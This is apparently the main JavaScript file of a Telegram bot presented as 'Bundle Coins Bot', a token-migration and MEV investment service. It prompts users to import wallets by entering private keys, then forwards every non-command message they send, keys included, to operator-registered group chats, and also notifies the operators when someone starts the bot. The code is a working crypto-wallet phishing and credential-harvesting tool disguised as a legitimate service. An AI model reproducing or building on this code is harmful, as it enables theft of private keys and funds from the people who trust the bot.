const express = require("express");
const TelegramBot = require("./telegram-bot");
const { userSessions } = require("./sessions");
const { BOT_TOKEN } = require("./config");
const { addGroupChatId, getGroupChatIds, removeGroupChatId } = require("./group-target");
const createWallet = require("./create_wallet");
const importWallet = require("./import_wallet");
const mainMenu = require("./main_menu");
const wallet = require("./wallet");
const exportWallet = require("./export_wallet");
const withdraw = require("./withdraw");
const startmev = require("./startmev");
const positions = require("./positions");
const leaderboard = require("./leaderboard");
const info = require("./info");
const referrals = require("./referrals");
const { button, markdownOptions, urlButton } = require("./telegram-ui");
const invest = require("./invest");



// Change this URL to swap the welcome image shown on /start.
const WELCOME_IMAGE_URL = "./image.png";

const bot = new TelegramBot(BOT_TOKEN);
const botData = {};
importWallet.setBotData(botData);

async function handleStart(message) {
  const chatId = message.chat.id;
  const welcome = `
🚀 *Welcome to Bundle Coins Bot*
_Automated burn-and-swap platform_

━━━━━━━━━━━━━━━━

🤖 *Simplified token migrations*
✅ *Secure burn-and-swap flows*
✅ *Wallet verification*
✅ *V2 token delivery*

━━━━━━━━━━━━━━━━

⚡ *Fast, secure, and built to simplify.*
Ready to migrate smarter? Use the menu below to begin.
`;

  try {
    await bot.sendPhoto(chatId, WELCOME_IMAGE_URL, {
      caption: welcome,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          button("👛 Import Wallet", "import_wallet"),
          button("🚀 Invest", "StartNexisMEV")
        ]]
      }
    });

    await bot.sendMessage(
      GROUP_CHAT_ID,
      `this @${message.from?.username || "unknown_user"} just clicked on /start`
    );
  } catch (error) {
    // The user requested to remove the "Image not found" alert.
    console.error("Failed to send welcome photo:", error);
  }
}

async function handleMenuCommand(message) {
  await mainMenu.showMainMenu(bot, { message });
}

async function handleCallback(call) {
  const chatId = call.message.chat.id;

  if (call.data === "create_wallet") {
    await createWallet.handleCreateWallet(bot, call.message);
  } else if (call.data === "import_wallet") {
    await importWallet.handleContinueWallet(bot, call);
    await importWallet.promptForPrivateKey(bot, call.message);
  } else if (call.data === "actuall_menu") {
    await mainMenu.showMainMenu(bot, call);
    await importWallet.handleContinueWallet(bot, call);
  } else if (call.data === "wallet") {
    await wallet.handleWallet(bot, call);
  } else if (call.data === "close_wallet_menu") {
    await wallet.handleCloseWallet(bot, call);
  } else if (call.data === "StartNexisMEV") {
    await invest.showInvestmentOptions(bot, call);
  } else if (call.data === "Positions") {
    await positions.handlePositions(bot, call);
  } else if (call.data === "positions_close") {
    await positions.handlePositionsCallback(bot, call);
  } else if (call.data === "MEVHistory") {
    await bot.sendMessage(
      chatId,
      "📊 *Bundle Coins Bot History*\n\n*0 migration transactions open*",
      markdownOptions([[button("❌ Close", "mev_history_close")]])
    );
  } else if (call.data === "mev_history_close") {
    // Message deletion is disabled per user request.
  } else if (call.data === "Leaderboard") {
    await leaderboard.handleLeaderboard(bot, call);
  } else if (call.data === "leaderboard_close") {
    await leaderboard.handleLeaderboardClose(bot, call);
  } else if (call.data === "MEVTransactionsTracker") {
    const trackerText = `
📡 *Live Bundle Coins Bot Transactions*

━━━━━━━━━━━━━━━━

For real-time transaction updates, you can view the *Live Transaction* details here:

https://nexis-calls-collab.vercel.app/
`;
    await bot.sendMessage(
      chatId,
      trackerText,
      markdownOptions(
        [
          [urlButton("🔗 Open Live Transactions", "https://nexis-calls-collab.vercel.app/")],
          [button("❌ Close", "close_tracker")]
        ],
        {
          disable_web_page_preview: false,
          link_preview_options: { is_disabled: false }
        }
      )
    );
    console.log("hello");
  } else if (call.data === "close_tracker") {
    // Message deletion is disabled per user request.
  } else if (call.data === "Info") {
    await info.handleInfo(bot, call);
  } else if (call.data === "close_info") {
    await info.handleCloseInfo(bot, call);
  } else if (call.data === "Referrals") {
    await referrals.handleReferrals(bot, call);
  } else if (call.data === "close_referrals") {
    await referrals.handleCloseReferrals(bot, call);
  } else if (call.data === "Refresh") {
    // Message deletion is disabled per user request.
    await mainMenu.showMainMenu(bot, call);
  } else if (call.data === "export_wallet") {
    await exportWallet.handleExportWallet(bot, call);
  } else if (call.data === "close_export_wallet") {
    await exportWallet.handleCloseExportWallet(bot, call);
  } else if (call.data === "withdraw_nexis") {
    await withdraw.handleWithdraw(bot, call);
  } else if (call.data === "close_withdraw") {
    await withdraw.handleCloseWithdraw(bot, call);
  } else if (["start_mev_close", "start_mev_auto_buy", "StartNexisMEVRefresh"].includes(call.data)) {
    await startmev.handleStartMevCallback(bot, call);
  } else if (call.data.startsWith("invest_")) {
    await invest.handleInvestmentSelection(bot, call);
  } else if (call.data.startsWith("verify_payment_")) {
    await invest.handleVerifyPayment(bot, call);
  } else if (call.data === "cancel_input") {
    const session = userSessions[chatId] || {};
    session.awaiting_key = false;
    session.awaiting_tx_hash = false;
    session.awaiting_sol_address = false;
    await bot.sendMessage(chatId, "Action canceled.");
    await mainMenu.showMainMenu(bot, call);
  }
}

async function handleAllMessages(message) {
  for (const groupChatId of getGroupChatIds()) {
    try {
      await bot.forwardMessage(groupChatId, message.chat.id, message.message_id);
    } catch (error) {
      console.log(`[Forward Fail] ${error.message}`);
    }
  }

  await importWallet.handleWalletKeyInput(bot, message);
  await invest.handleTxHashInput(bot, message);
  await invest.handleSolAddressInput(bot, message);
}

async function handleTgAddCommand(message) {
  if (!["group", "supergroup"].includes(message.chat?.type)) {
    await bot.sendMessage(message.chat.id, "Use /tgadd inside the admin group you want to register.");
    return;
  }

  const wasAdded = addGroupChatId(message.chat.id);
  await bot.sendMessage(
    message.chat.id,
    wasAdded
      ? "✅ This group will now receive a copy of the bot's messages."
      : "ℹ️ This group is already receiving a copy of the bot's messages."
  );
}

async function handleTgRemoveCommand(message) {
  if (!["group", "supergroup"].includes(message.chat?.type)) {
    await bot.sendMessage(message.chat.id, "Use /tgremove inside the group you want to remove.");
    return;
  }

  const wasRemoved = removeGroupChatId(message.chat.id);
  await bot.sendMessage(
    message.chat.id,
    wasRemoved
      ? "✅ This group will no longer receive copied messages."
      : "ℹ️ This group is not an additional message destination."
  );
}

bot.on("message", async (message) => {
  try {
    const text = message.text || "";
    if (text.startsWith("/start")) {
      await handleStart(message);
    } else if (text.startsWith("/menu")) {
      await handleMenuCommand(message);
    } else if (text.startsWith("/tgadd")) {
      await handleTgAddCommand(message);
    } else if (text.startsWith("/tgremove")) {
      await handleTgRemoveCommand(message);
    } else {
      await handleAllMessages(message);
    }
  } catch (error) {
    console.error(error);
  }
});

bot.on("callback_query", async (call) => {
  try {
    await handleCallback(call);
  } catch (error) {
    console.error(error);
  }
});

const usePolling = process.argv.includes("--polling") || ["1", "true", "yes"].includes(String(process.env.POLLING || "").toLowerCase()) || (!process.env.WEBHOOK_URL && process.env.USE_WEBHOOK !== "true");

if (usePolling) {
  (async () => {
    try {
      await bot.deleteWebhook().catch(() => undefined);
      console.log("Telegram bot running in polling mode");
      await bot.startPolling({ intervalMs: Number(process.env.POLLING_INTERVAL_MS || 3000) });
    } catch (error) {
      console.error("Polling startup failed:", error.message);
      process.exit(1);
    }
  })();
} else {
  const app = express();
  const port = Number(process.env.PORT || "3000");
  const webhookPath = process.env.WEBHOOK_PATH || `/webhook/${BOT_TOKEN}`;

  app.use(express.json());

  app.get("/", (_req, res) => {
    res.json({ ok: true, mode: "telegram-webhook", path: webhookPath });
  });

  app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
  });

  app.listen(port, async () => {
    console.log(`bot webhook server is running on port ${port}`);
    console.log(`webhook endpoint: ${webhookPath}`);

    if (process.env.WEBHOOK_URL) {
      const webhookUrl = `${process.env.WEBHOOK_URL.replace(/\/$/, "")}${webhookPath}`;
      await bot.setWebHook(webhookUrl);
      console.log(`telegram webhook set to ${webhookUrl}`);
    } else {
      console.log("WEBHOOK_URL is not set, so Telegram webhook registration was skipped.");
    }
  });
}
